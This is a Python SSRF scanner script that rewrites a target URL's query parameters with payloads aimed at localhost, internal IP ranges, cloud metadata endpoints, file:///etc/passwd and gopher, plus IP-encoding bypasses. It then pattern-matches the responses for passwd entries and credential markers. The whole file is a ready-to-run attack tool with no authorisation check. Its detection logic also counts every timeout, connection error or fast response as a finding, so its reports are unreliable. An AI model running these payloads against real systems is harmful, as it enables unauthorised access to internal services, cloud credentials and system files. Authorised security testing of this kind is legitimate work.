from colorama import Fore
import requests
import re
import threading
import sys
import logging
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from typing import List, Dict, Tuple, Set
import concurrent.futures

# Set up logging for errors only
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

class SSRFScanner:
    """Advanced SSRF vulnerability scanner with improved detection and safety."""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Enhanced SSRF payloads for different contexts
        self.ssrf_payloads = [
            # Local network probes
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://localhost.localdomain",
            
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            
            # Internal network ranges
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # Protocol handlers
            "file:///etc/passwd",
            "ftp://127.0.0.1",
            "gopher://127.0.0.1:25",
            
            # Bypass techniques
            "http://127.1",
            "http://0177.0.0.1",  # Octal
            "http://2130706433",  # Decimal
            "http://[::ffff:127.0.0.1]",  # IPv6
            
            # URL redirections for bypass
            "http://127.0.0.1.xip.io",
            "http://www.127.0.0.1.nip.io",
        ]
        
        # Detection patterns for successful SSRF
        self.detection_patterns = [
            # Error messages indicating internal access
            r"connection\s+refused",
            r"network\s+is\s+unreachable",
            r"no\s+route\s+to\s+host",
            r"connection\s+timed\s+out",
            r"internal\s+server\s+error",
            
            # Cloud metadata responses
            r"ami-[0-9a-f]{8,}",
            r"instance-id",
            r"local-hostname",
            r"placement/availability-zone",
            
            # File system access
            r"root:.*?:",
            r"daemon:.*?:",
            r"/bin/bash",
            r"/bin/sh",
        ]
        
    def is_valid_url(self, url: str) -> bool:
        """Validate URL format."""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False
    
    def extract_parameters(self, url: str) -> Dict[str, List[str]]:
        """
        Extract URL parameters for testing.
        
        Args:
            url: Target URL to extract parameters from
            
        Returns:
            Dictionary of parameter names and their values
        """
        parameters = {}
        
        try:
            parsed_url = urlparse(url)
            
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query, keep_blank_values=True)
                parameters.update(query_params)
            
            # Also check for common parameter patterns in path
            path_params = re.findall(r'[?&](\w+)=([^&]*)', url)
            for param, value in path_params:
                if param not in parameters:
                    parameters[param] = [value] if value else ['']
            
        except Exception as e:
            logger.error(f"Error extracting parameters: {str(e)}")
        
        return parameters
    
    def detect_ssrf_response(self, response: requests.Response, payload: str) -> bool:
        """
        Analyze response for SSRF indicators.
        
        Args:
            response: HTTP response object
            payload: SSRF payload used
            
        Returns:
            True if SSRF is detected, False otherwise
        """
        try:
            content = response.text.lower()
            
            # Check for detection patterns
            for pattern in self.detection_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
            
            # Check for specific cloud metadata indicators
            if "169.254.169.254" in payload.lower():
                cloud_indicators = [
                    "security-credentials",
                    "iam/info",
                    "instance-identity",
                    "user-data"
                ]
                
                for indicator in cloud_indicators:
                    if indicator in content:
                        return True
            
            # Check response time for internal network timeouts
            if hasattr(response, 'elapsed'):
                # Extremely fast responses might indicate localhost access
                if response.elapsed.total_seconds() < 0.1 and len(content) > 0:
                    return True
            
            # Check for status codes that might indicate internal access
            if response.status_code in [403, 500, 502, 503, 504]:
                # These might indicate internal service access
                internal_indicators = [
                    "internal",
                    "private",
                    "restricted",
                    "unauthorized"
                ]
                
                for indicator in internal_indicators:
                    if indicator in content:
                        return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error in SSRF detection: {str(e)}")
            return False
    
    def test_parameter_for_ssrf(self, param_name: str, param_value: str, base_url: str) -> List[Tuple[str, str]]:
        """
        Test a single parameter for SSRF vulnerability.
        
        Args:
            param_name: Parameter name to test
            param_value: Original parameter value
            base_url: Base URL for testing
            
        Returns:
            List of vulnerability tuples (payload, response_info)
        """
        vulnerabilities = []
        
        for payload in self.ssrf_payloads:
            try:
                # Parse the base URL
                parsed_url = urlparse(base_url)
                
                # Get existing parameters
                existing_params = parse_qs(parsed_url.query, keep_blank_values=True)
                
                # Update the target parameter with SSRF payload
                test_params = {}
                for key, values in existing_params.items():
                    if key == param_name:
                        test_params[key] = payload
                    else:
                        test_params[key] = values[0] if values else ''
                
                # Construct test URL
                test_query = urlencode(test_params)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                if test_query:
                    test_url += f"?{test_query}"
                
                # Make request with timeout and error handling
                response = self.session.get(
                    test_url,
                    timeout=10,
                    allow_redirects=False,  # Don't follow redirects for SSRF testing
                    verify=False
                )
                
                # Analyze response for SSRF indicators
                if self.detect_ssrf_response(response, payload):
                    vulnerabilities.append((payload, f"Status: {response.status_code}, Length: {len(response.text)}"))
                    logger.info(f"SSRF found: {param_name} - {payload}")
                
            except requests.exceptions.Timeout:
                # Timeout might indicate successful internal connection
                vulnerabilities.append((payload, "Connection timeout - possible internal access"))
            except requests.exceptions.ConnectionError:
                # Connection error might indicate successful SSRF to closed port
                vulnerabilities.append((payload, "Connection error - possible internal network access"))
            except Exception as e:
                logger.error(f"Error testing SSRF payload {payload}: {str(e)}")
                continue
            
            # Rate limiting to avoid overwhelming the target
            time.sleep(0.5)
        
        return vulnerabilities
    
    def scan_for_ssrf(self) -> None:
        """
        Main SSRF scanning function.
        """
        if not self.is_valid_url(self.target_url):
            print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error: Invalid URL format")
            return
        
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Starting SSRF scan for: {Fore.GREEN}{self.target_url}")
        
        # Extract parameters from URL
        parameters = self.extract_parameters(self.target_url)
        
        if not parameters:
            print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No parameters found in URL for SSRF testing")
            return
        
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Found {len(parameters)} parameter(s) to test")
        
        all_vulnerabilities = []
        
        # Test each parameter for SSRF
        for param_name, param_values in parameters.items():
            param_value = param_values[0] if param_values else ''
            
            print(f"{Fore.CYAN}[*] Testing parameter: {param_name}")
            
            vulnerabilities = self.test_parameter_for_ssrf(param_name, param_value, self.target_url)
            
            if vulnerabilities:
                all_vulnerabilities.extend([(param_name, payload, info) for payload, info in vulnerabilities])
        
        # Report results
        if all_vulnerabilities:
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} SSRF Found: {Fore.RED}{len(all_vulnerabilities)} potential vulnerability(ies)")
            
            # Save results
            self.save_results(all_vulnerabilities)
            
            # Display summary
            for param, payload, info in all_vulnerabilities:
                print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} SSRF in parameter '{param}': {Fore.YELLOW}{payload}")
        else:
            print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No SSRF vulnerabilities found")
    
    def save_results(self, vulnerabilities: List[Tuple[str, str, str]]) -> None:
        """Save SSRF test results to file."""
        try:
            import os
            os.makedirs("output", exist_ok=True)
            
            with open("output/ssrf.txt", "w", encoding='utf-8') as f:
                f.write("=== SSRF Vulnerability Report ===\n\n")
                f.write(f"Target URL: {self.target_url}\n")
                f.write(f"Total vulnerabilities found: {len(vulnerabilities)}\n\n")
                
                for i, (param, payload, info) in enumerate(vulnerabilities, 1):
                    f.write(f"--- Vulnerability #{i} ---\n")
                    f.write(f"Parameter: {param}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write(f"Response Info: {info}\n")
                    f.write("\n" + "="*50 + "\n\n")
                    
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} SSRF Report: {Fore.GREEN}Saved to /output/ssrf.txt")
            
        except Exception as e:
            logger.error(f"Error saving SSRF results: {str(e)}")

def main():
    """Main function for command-line usage."""
    if len(sys.argv) != 2:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Usage: python3 ssrf.py <URL>")
        print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} Example: python3 ssrf.py 'https://example.com/page?url=http://example.com'")
        return
    
    target_url = sys.argv[1]
    
    try:
        scanner = SSRFScanner(target_url)
        scanner.scan_for_ssrf()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} SSRF scan interrupted by user")
    except Exception as e:
        logger.error(f"SSRF scan error: {str(e)}")
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error during SSRF scan: {str(e)}")

if __name__ == "__main__":
    main()

